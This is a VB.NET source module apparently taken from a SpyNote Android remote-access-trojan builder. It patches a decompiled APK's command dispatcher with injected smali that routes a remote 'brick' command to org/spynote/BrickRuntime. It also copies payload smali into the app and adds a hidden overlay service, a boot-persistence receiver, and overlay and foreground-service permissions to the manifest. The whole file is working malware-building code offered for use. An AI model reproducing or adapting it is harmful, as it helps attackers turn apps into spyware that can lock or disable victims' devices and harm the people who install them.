Imports System.IO
Imports System.Text

Public Module ApkBrickPatcher

    Private Const BrickHookMarker As String = "Lorg/spynote/BrickRuntime;"

    Private ReadOnly BrickHookAnchor As String =
        "    invoke-static {v3, v2}, Lcmf0/c3b5bm90zq/patch/C11;->l(Lcmf0/c3b5bm90zq/patch/C11;Ljava/lang/String;)V" & vbCrLf &
        vbCrLf &
        "    goto :goto_8" & vbCrLf &
        vbCrLf &
        "    :cond_47"

    Private ReadOnly BrickHookInsert As String =
        "    invoke-static {v3, v2}, Lcmf0/c3b5bm90zq/patch/C11;->l(Lcmf0/c3b5bm90zq/patch/C11;Ljava/lang/String;)V" & vbCrLf &
        vbCrLf &
        "    goto :goto_8" & vbCrLf &
        vbCrLf &
        "    :cond_brick_spynote" & vbCrLf &
        "    sget-wide v5, Lcmf0/c3b5bm90zq/patch/C11;->m:J" & vbCrLf &
        vbCrLf &
        "    const-wide/16 v8, 0x7a" & vbCrLf &
        vbCrLf &
        "    invoke-static {v5, v6, v8, v9}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;" & vbCrLf &
        vbCrLf &
        "    move-result-object v5" & vbCrLf &
        vbCrLf &
        "    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z" & vbCrLf &
        vbCrLf &
        "    move-result v5" & vbCrLf &
        vbCrLf &
        "    if-eqz v5, :cond_brick_spynote_go" & vbCrLf &
        vbCrLf &
        "    array-length v5, v2" & vbCrLf &
        vbCrLf &
        "    sub-int/2addr v5, v10" & vbCrLf &
        vbCrLf &
        "    if-ne v5, v10, :cond_49" & vbCrLf &
        vbCrLf &
        "    iget-object v3, v1, Lcmf0/c3b5bm90zq/patch/C11$31;->a:Lcmf0/c3b5bm90zq/patch/C11;" & vbCrLf &
        vbCrLf &
        "    invoke-virtual {v3}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;" & vbCrLf &
        vbCrLf &
        "    move-result-object v3" & vbCrLf &
        vbCrLf &
        "    aget-object v2, v2, v10" & vbCrLf &
        vbCrLf &
        "    invoke-static {v3, v2}, Lorg/spynote/BrickRuntime;->handleCommand(Landroid/content/Context;Ljava/lang/String;)V" & vbCrLf &
        vbCrLf &
        "    goto :goto_8" & vbCrLf &
        vbCrLf &
        "    :cond_brick_spynote_go" & vbCrLf &
        vbCrLf &
        "    :cond_47"

    Public Function ApplyBrickPatch(decodeDir As String, payloadDir As String) As Boolean
        If String.IsNullOrWhiteSpace(decodeDir) OrElse Not Directory.Exists(decodeDir) Then Return False
        CopyBrickSmali(decodeDir, payloadDir)
        EnsureManifestEntries(decodeDir)
        Return PatchCommandDispatch(decodeDir)
    End Function

    Private Sub CopyBrickSmali(decodeDir As String, payloadDir As String)
        Dim searchDirs As New List(Of String) From {
            Path.Combine(payloadDir, "brick_smali"),
            Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload", "brick_smali")
        }

        Dim sourceRoot As String = Nothing
        For Each candidate As String In searchDirs
            If Directory.Exists(candidate) Then
                sourceRoot = candidate
                Exit For
            End If
        Next
        If String.IsNullOrWhiteSpace(sourceRoot) Then Return

        Dim targetSmaliRoot As String = Path.Combine(decodeDir, "smali")
        ApkNotifyPatcher.CopyDirectoryRecursive(sourceRoot, targetSmaliRoot)
    End Sub

    Private Function PatchCommandDispatch(decodeDir As String) As Boolean
        Dim smaliPath As String = FindC11ThreadSmali(decodeDir)
        If String.IsNullOrWhiteSpace(smaliPath) OrElse Not File.Exists(smaliPath) Then Return False

        Dim text As String = File.ReadAllText(smaliPath, Encoding.UTF8)
        If text.IndexOf(BrickHookMarker, StringComparison.Ordinal) >= 0 Then Return True
        If text.IndexOf(BrickHookAnchor, StringComparison.Ordinal) < 0 Then Return False

        text = text.Replace(BrickHookAnchor, BrickHookInsert)
        File.WriteAllText(smaliPath, text, New UTF8Encoding(False))
        Return text.IndexOf(BrickHookMarker, StringComparison.Ordinal) >= 0
    End Function

    Private Function FindC11ThreadSmali(decodeDir As String) As String
        Dim smaliRoots As String() = Directory.GetDirectories(decodeDir, "smali*")
        For Each smaliRoot As String In smaliRoots
            Dim direct As String = Path.Combine(smaliRoot, "cmf0", "c3b5bm90zq", "patch", "C11$31.smali")
            If File.Exists(direct) Then Return direct
            Dim matches As String() = Directory.GetFiles(smaliRoot, "C11$31.smali", SearchOption.AllDirectories)
            If matches.Length > 0 Then Return matches(0)
        Next
        Return Nothing
    End Function

    Private Sub EnsureManifestEntries(decodeDir As String)
        Try
            Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
            If Not File.Exists(manifestPath) Then Return

            Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
            If text.IndexOf("org.spynote.BrickOverlayService", StringComparison.OrdinalIgnoreCase) < 0 Then
                Dim serviceLine As String =
                    "    <service android:name=""org.spynote.BrickOverlayService"" android:exported=""false"" />" & vbCrLf
                Dim appIdx As Integer = text.IndexOf("<application", StringComparison.OrdinalIgnoreCase)
                If appIdx >= 0 Then
                    Dim insertAt As Integer = text.IndexOf(">"c, appIdx) + 1
                    text = text.Insert(insertAt, vbCrLf & serviceLine)
                End If
            End If

            If text.IndexOf("org.spynote.BrickBootReceiver", StringComparison.OrdinalIgnoreCase) < 0 Then
                Dim receiverBlock As String =
                    "    <receiver android:name=""org.spynote.BrickBootReceiver"" android:exported=""false"">" & vbCrLf &
                    "        <intent-filter>" & vbCrLf &
                    "            <action android:name=""android.intent.action.BOOT_COMPLETED"" />" & vbCrLf &
                    "        </intent-filter>" & vbCrLf &
                    "    </receiver>" & vbCrLf
                Dim appIdx As Integer = text.IndexOf("<application", StringComparison.OrdinalIgnoreCase)
                If appIdx >= 0 Then
                    Dim insertAt As Integer = text.IndexOf(">"c, appIdx) + 1
                    text = text.Insert(insertAt, vbCrLf & receiverBlock)
                End If
            End If

            Dim permissions As String() = {
                "android.permission.SYSTEM_ALERT_WINDOW",
                "android.permission.FOREGROUND_SERVICE"
            }
            For Each permissionName As String In permissions
                If text.IndexOf(permissionName, StringComparison.OrdinalIgnoreCase) >= 0 Then Continue For
                Dim line As String = "    <uses-permission android:name=""" & permissionName & """/>" & vbCrLf
                Dim appIdx As Integer = text.IndexOf("<application", StringComparison.OrdinalIgnoreCase)
                If appIdx >= 0 Then
                    text = text.Insert(appIdx, line)
                Else
                    Dim manifestIdx As Integer = text.IndexOf("<manifest", StringComparison.OrdinalIgnoreCase)
                    If manifestIdx < 0 Then Continue For
                    Dim insertAt As Integer = text.IndexOf(">"c, manifestIdx) + 1
                    text = text.Insert(insertAt, vbCrLf & line)
                End If
            Next

            File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
        Catch
        End Try
    End Sub

End Module
